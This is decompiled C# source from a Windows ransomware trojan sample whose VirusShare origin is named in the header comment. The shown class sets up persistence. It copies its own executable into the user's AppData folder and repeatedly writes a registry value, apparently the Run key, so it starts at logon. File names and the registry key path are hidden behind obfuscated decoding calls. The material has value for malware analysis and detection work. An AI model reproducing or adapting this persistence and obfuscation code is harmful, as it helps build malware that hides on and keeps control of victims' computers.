// Decompiled with JetBrains decompiler
// Type: DAStartup
// Assembly: new2, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7D97D205-93EA-4722-A1E5-21E77DE843A1
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-30a4eb8393f203db2dc365b910e352cfc02ba6f80a0ccd316800296661747606.exe

using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

public class DAStartup
{
  public class Startupdll
  {
    public static string MyVAL = WOGVCL.TGKKNH("hsnU08qkerrcwqDOyt4L", "False");
    public static string MYPTH = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + WOGVCL.TGKKNH("e4eur7COrbSysnuNvr9/lJ6uu2yEsqoq", "False");

    public static void StartPers()
    {
      int num1 = 0;
      try
      {
        if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + WOGVCL.TGKKNH("e4eur7COrbSysnuNvr9/lJ6uu2yEsqoq", "False")))
          File.Copy(Process.GetCurrentProcess().MainModule.FileName, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + WOGVCL.TGKKNH("e4eur7COrbSysnuNvr9/lJ6uu2yEsqoq", "False"), true);
      }
      catch (Exception ex)
      {
        int num2;
        int lErl = num2;
        ProjectData.SetProjectError(ex, lErl);
        ProjectData.ClearProjectError();
      }
      while (true)
      {
        int num3 = 1;
        try
        {
          RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(WOGVCL.TGKKNH("c6qswbaBraupjImeuLyyj6G6qZaJqaq8tpOXicKxkqC0wZWFrbm2ro6XmMKtJg==", "False"), true);
          registryKey.SetValue(DAStartup.Startupdll.MyVAL, (object) DAStartup.Startupdll.MYPTH);
          registryKey.Close();
          Thread.Sleep(5000);
          try
          {
            CMFVPTX.STRTTHRD.Abort();
            break;
          }
          catch (Exception ex)
          {
            int lErl = num3;
            ProjectData.SetProjectError(ex, lErl);
            ProjectData.ClearProjectError();
            break;
          }
        }
        catch (Exception ex1)
        {
          int lErl1 = num3;
          ProjectData.SetProjectError(ex1, lErl1);
          if (num1 == 3)
          {
            try
            {
              CMFVPTX.STRTTHRD.Abort();
            }
            catch (Exception ex2)
            {
              int lErl2 = num3;
              ProjectData.SetProjectError(ex2, lErl2);
              ProjectData.ClearProjectError();
            }
            ProjectData.ClearProjectError();
            break;
          }
          checked { ++num1; }
          ProjectData.ClearProjectError();
        }
      }
    }
  }
}
